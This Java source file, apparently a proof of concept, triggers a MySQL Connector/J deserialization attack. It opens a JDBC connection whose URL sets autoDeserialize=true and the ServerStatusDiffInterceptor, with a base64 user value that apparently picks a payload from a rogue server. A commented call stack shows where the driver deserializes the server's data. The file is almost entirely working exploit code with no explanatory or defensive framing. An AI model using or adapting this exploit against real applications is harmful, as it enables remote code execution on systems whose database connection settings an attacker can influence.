package EXP;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;

public class JDBCDeserEXP {
    static final String JDBC_DRIVER = "com.mysql.cj.jdbc.Driver";
    static final String DB_URL = "jdbc:mysql://127.0.0.1:42299/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=base64ZGVzZXJfQ1VTVE9N";
    /*
getObject:1326, ResultSetImpl (com.mysql.cj.jdbc.result)
resultSetToMap:46, ResultSetUtil (com.mysql.cj.jdbc.util)
populateMapWithSessionStatusValues:87, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:105, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:76, NoSubInterceptorWrapper (com.mysql.cj)
invokeQueryInterceptorsPre:1137, NativeProtocol (com.mysql.cj.protocol.a)
sendQueryPacket:963, NativeProtocol (com.mysql.cj.protocol.a)
sendQueryString:914, NativeProtocol (com.mysql.cj.protocol.a)
execSQL:1150, NativeSession (com.mysql.cj)
setAutoCommit:2064, ConnectionImpl (com.mysql.cj.jdbc)
handleAutoCommitDefaults:1382, ConnectionImpl (com.mysql.cj.jdbc)
initializePropsFromServer:1327, ConnectionImpl (com.mysql.cj.jdbc)
connectOneTryOnly:966, ConnectionImpl (com.mysql.cj.jdbc)
createNewIO:825, ConnectionImpl (com.mysql.cj.jdbc)
<init>:455, ConnectionImpl (com.mysql.cj.jdbc)
getInstance:240, ConnectionImpl (com.mysql.cj.jdbc)
connect:207, NonRegisteringDriver (com.mysql.cj.jdbc)
getConnection:664, DriverManager (java.sql)
getConnection:270, DriverManager (java.sql)
main:22, JDBCDeserEXP (EXP)
     */

    public static void main(String[] args) {
        Connection conn = null;
        Statement stmt = null;
        try{
            // 步骤 2：注册 JDBC 驱动程序
            Class.forName(JDBC_DRIVER);

            // 步骤 3：建立连接
            System.out.println("Connecting to database...");
            conn = DriverManager.getConnection(DB_URL);
            // trigger deserialization

        }catch(SQLException se){
            // 处理 JDBC 错误
            se.printStackTrace();
        }catch(Exception e){
            // 处理 Class.forName 的错误
            e.printStackTrace();
        }finally{
            // 用于关闭资源
            try{
                if(stmt!=null)
                    stmt.close();
            }catch(SQLException se2){

            }
            try{
                if(conn!=null)
                    conn.close();
            }catch(SQLException se){
                se.printStackTrace();
            }
        }// 结束 try
        System.out.println("Goodbye!");
    }// 结束 main
}
